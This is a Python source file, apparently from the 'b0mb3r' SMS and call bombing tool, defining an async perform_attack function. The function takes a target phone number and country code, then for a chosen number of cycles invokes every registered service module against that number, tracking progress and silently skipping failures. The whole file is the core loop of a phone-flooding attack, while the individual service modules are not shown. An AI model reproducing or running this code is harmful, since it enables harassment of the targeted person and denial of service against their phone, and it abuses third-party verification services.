from datetime import datetime

from loguru import logger

from b0mb3r.app.status import status
from b0mb3r.service import services


@logger.catch
async def perform_attack(attack_id: str, number_of_cycles: int, country_code: int, phone: str):
    status[attack_id]["started_at"] = datetime.now().isoformat()
    status[attack_id]["end_at"] = len(services) * number_of_cycles

    logger.info(f"Starting attack {attack_id} on +{phone}...")

    for cycle in range(number_of_cycles):
        for i, a in enumerate(services.items()):
            module, service = a
            status[attack_id]["currently_at"] = (i + 1) * (cycle + 1)
            supported_phone_codes = getattr(module, service).phone_codes

            if len(supported_phone_codes) == 0 or country_code in supported_phone_codes:
                logger.debug(f"Running {module} {service} in attack {attack_id}")
                try:
                    await getattr(module, service)(phone, country_code).run()
                except Exception:
                    continue

    logger.success(f"Attack {attack_id} on +{phone} ended")
